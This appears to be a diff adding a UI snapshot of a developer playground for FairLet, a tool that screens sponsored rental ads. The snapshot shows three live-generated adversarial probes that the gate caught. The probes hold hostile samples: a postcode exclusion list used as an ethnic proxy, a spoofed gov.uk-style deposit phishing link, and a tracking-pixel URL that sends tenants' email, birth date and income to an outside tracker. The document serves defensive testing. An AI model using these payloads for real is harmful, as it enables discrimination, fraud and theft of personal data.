@@ -1,0 +1,167 @@
+- generic [ref=e4]:
+  - banner [ref=e5]:
+    - generic [ref=e7]:
+      - img [ref=e8]
+      - generic [ref=e9]: fairlet
+      - generic [ref=e29]: 0.1.0
+    - generic [ref=e10]:
+      - button "Tunnel" [ref=e11] [cursor=pointer]: Tunnel
+      - button "Playground" [ref=e13] [cursor=pointer]:
+        - img
+        - text: Playground
+      - button "Audit" [ref=e14] [cursor=pointer]:
+        - img
+        - text: Audit
+      - button "Deploy" [ref=e15] [cursor=pointer]:
+        - img
+        - text: Deploy
+    - navigation [ref=e17]:
+      - link "discord" [ref=e19] [cursor=pointer]:
+        - /url: https://discord.gg/awV4gu74wK
+      - generic [ref=e20]:
+        - generic [ref=e21]: ·
+        - link "docs" [ref=e22] [cursor=pointer]:
+          - /url: https://docs.skybridge.tech/
+      - generic [ref=e23]:
+        - generic [ref=e24]: ·
+        - link "github" [ref=e25] [cursor=pointer]:
+          - /url: https://github.com/alpic-ai/skybridge
+  - generic [ref=e30]:
+    - complementary [ref=e33]:
+      - generic [ref=e34]:
+        - generic [ref=e35]:
+          - generic [ref=e36]: Tools
+          - button "Refresh tools" [ref=e37] [cursor=pointer]:
+            - img
+        - generic [ref=e38]:
+          - generic [ref=e39]:
+            - heading "search-rentals" [level=3] [ref=e40]:
+              - button "search-rentals" [ref=e41] [cursor=pointer]:
+                - img [ref=e42]
+                - generic [ref=e44]: search-rentals
+            - generic [ref=e47]: Search UK rental listings with policy-gated sponsored placements. Returns organic results and any sponsored card that passed the FairLet policy gate.
+          - generic [ref=e48]:
+            - heading "run-audit" [level=3] [ref=e49]:
+              - button "run-audit" [ref=e50] [cursor=pointer]:
+                - img [ref=e51]
+                - generic [ref=e53]: run-audit
+            - generic [ref=e56]: Run a continuous compliance audit against the FairLet policy gate. Fires 10 adversarial probes and returns a Publisher Trust Score with full traces.
+          - generic [ref=e57]:
+            - heading "generate-fresh-probes Run" [level=3] [ref=e58]:
+              - button "generate-fresh-probes" [disabled] [expanded] [ref=e59]:
+                - img [ref=e60]
+                - generic [ref=e62]: generate-fresh-probes
+              - button "Run" [ref=e64] [cursor=pointer]:
+                - img
+                - text: Run
+            - region "generate-fresh-probes" [ref=e65]:
+              - generic [ref=e67]:
+                - button "Generate fresh adversarial probes via Claude and run them through the policy gate live. Use this in Q&A to prove the gate is not just passing a curated regression suite." [ref=e69] [cursor=pointer]:
+                  - generic [ref=e70]: Generate fresh adversarial probes via Claude and run them through the policy gate live. Use this in Q&A to prove the gate is not just passing a curated regression suite.
+                - generic [ref=e71]:
+                  - generic [ref=e72]:
+                    - tablist [ref=e73]:
+                      - tab "form" [selected] [ref=e74] [cursor=pointer]
+                      - tab "json" [ref=e75] [cursor=pointer]
+                    - button "Copy input" [ref=e76] [cursor=pointer]:
+                      - img [ref=e77]
+                  - tabpanel "form" [ref=e80]:
+                    - generic [ref=e86]:
+                      - generic [ref=e87]: count
+                      - spinbutton "count" [ref=e88]: "3"
+          - generic [ref=e89]:
+            - heading "show-dashboard" [level=3] [ref=e90]:
+              - button "show-dashboard" [ref=e91] [cursor=pointer]:
+                - img [ref=e92]
+                - generic [ref=e94]: show-dashboard
+            - generic [ref=e97]: Show the FairLet publisher dashboard — Publisher Trust Score (measurement) and Trust-Adjusted CPM (sell-side yield).
+          - generic [ref=e98]:
+            - heading "check-placement" [level=3] [ref=e99]:
+              - button "check-placement" [ref=e100] [cursor=pointer]:
+                - img [ref=e101]
+                - generic [ref=e103]: check-placement
+            - generic [ref=e106]: Evaluate a sponsored ad placement against the FairLet policy gate. Returns serve/flag/block with reasons, citations, and scores. The MCP endpoint judges can hit directly.
+    - separator [ref=e107]
+    - main [ref=e110]:
+      - generic [ref=e111]:
+        - button "Tool output OK · 10553ms · 3.0kb View state 1 token" [ref=e112] [cursor=pointer]:
+          - generic [ref=e113]:
+            - generic [ref=e114]: Tool output
+            - generic [ref=e115]:
+              - generic [ref=e116]: OK
+              - generic [ref=e117]: ·
+              - generic [ref=e118]: 10553ms
+              - generic [ref=e119]: ·
+              - generic [ref=e120]: 3.0kb
+          - generic [ref=e121]:
+            - generic [ref=e122]: View state
+            - generic [ref=e124]: 1 token
+        - generic [ref=e131]:
+          - generic [ref=e132]:
+            - generic [ref=e133]:
+              - button "fullscreen" [ref=e134] [cursor=pointer]:
+                - img [ref=e135]
+                - generic [ref=e140]: fullscreen
+              - button "pip" [ref=e141] [cursor=pointer]:
+                - img [ref=e142]
+                - generic [ref=e145]: pip
+              - button "inline" [pressed] [ref=e146] [cursor=pointer]:
+                - img [ref=e147]
+                - generic [ref=e150]: inline
+            - button "light" [ref=e151] [cursor=pointer]:
+              - img [ref=e152]
+              - generic [ref=e158]: light
+            - button "Locale" [ref=e159] [cursor=pointer]:
+              - img [ref=e160]
+              - generic [ref=e164]: English (US)
+            - button "desktop" [ref=e165] [cursor=pointer]:
+              - img [ref=e166]
+              - generic [ref=e168]: desktop
+            - button "logs" [ref=e169] [cursor=pointer]:
+              - img [ref=e170]
+              - generic [ref=e171]: logs
+          - iframe [ref=e174]:
+            - generic [ref=f8e4]:
+              - generic [ref=f8e5]:
+                - generic [ref=f8e6]:
+                  - generic [ref=f8e7]: Fresh probes · live generation
+                  - generic [ref=f8e8]:
+                    - generic [ref=f8e9]:
+                      - text: "3"
+                      - generic [ref=f8e10]: /3
+                    - generic [ref=f8e11]: caught — not part of the regression suite
+                - generic [ref=f8e12]: Claude live
+              - generic [ref=f8e14]:
+                - generic [ref=f8e15]:
+                  - generic [ref=f8e16]:
+                    - generic [ref=f8e17]:
+                      - generic [ref=f8e18]: P01
+                      - generic [ref=f8e19]: Postcode proxy excludes ethnic minority areas
+                      - generic [ref=f8e20]: discrimination
+                    - generic [ref=f8e21]: block
+                  - generic [ref=f8e22]: "targeting.exclude_postcodes: [\"E1\",\"E7\",\"BD3\",\"B10\"]; targeting.note: \"premium tenant profile only\""
+                  - generic [ref=f8e23]: "Gate reason: Equality Act violation: payload references protected characteristic \"ethnic\"."
+                  - generic [ref=f8e24]: Equality Act 2010, s.33
+                - generic [ref=f8e25]:
+                  - generic [ref=f8e26]:
+                    - generic [ref=f8e27]:
+                      - generic [ref=f8e28]: P02
+                      - generic [ref=f8e29]: Fake council-approved badge with phishing link
+                      - generic [ref=f8e30]: fraud
+                    - generic [ref=f8e31]: flag
+                  - generic [ref=f8e32]: "creative.badges: [\"Council-Approved Landlord ✓\"]; creative.cta_url: \"https://gov-uk-tenancy-verify.com/pay-deposit\"; copy: \"Secure your flat — pay £350 holding deposit via link to skip the queue.\""
+                  - generic [ref=f8e33]: "Gate reason: Fabricated government endorsement combined with off-platform deposit collection via a spoofed gov.uk-style domain is consumer fraud and likely a tenancy deposit scam."
+                  - generic [ref=f8e34]: Tenant Fees Act 2019 / ASA CAP Code
+                - generic [ref=f8e35]:
+                  - generic [ref=f8e36]:
+                    - generic [ref=f8e37]:
+                      - generic [ref=f8e38]: P03
+                      - generic [ref=f8e39]: Tracking pixel exfiltrating tenant PII to third party
+                      - generic [ref=f8e40]: gdpr
+                    - generic [ref=f8e41]: flag
+                  - generic [ref=f8e42]: "creative.pixels: [\"https://adtrack.ru/p.gif?email={{user.email}}&dob={{user.dob}}&income={{user.income_band}}\"]; consent_mode: \"off\""
+                  - generic [ref=f8e43]: "Gate reason: Transmitting identifiable tenant data including email, DOB and income to a third-country tracker without lawful basis or consent breaches UK GDPR Articles 6, 44 and PECR."
+                  - generic [ref=f8e44]: UK GDPR Art. 7
+              - generic [ref=f8e45]:
+                - generic [ref=f8e46]: "Hand the judges the repo URL — they can hit `generate-fresh-probes` themselves and get a different set every time."
+                - button "Regenerate" [ref=f8e47] [cursor=pointer]
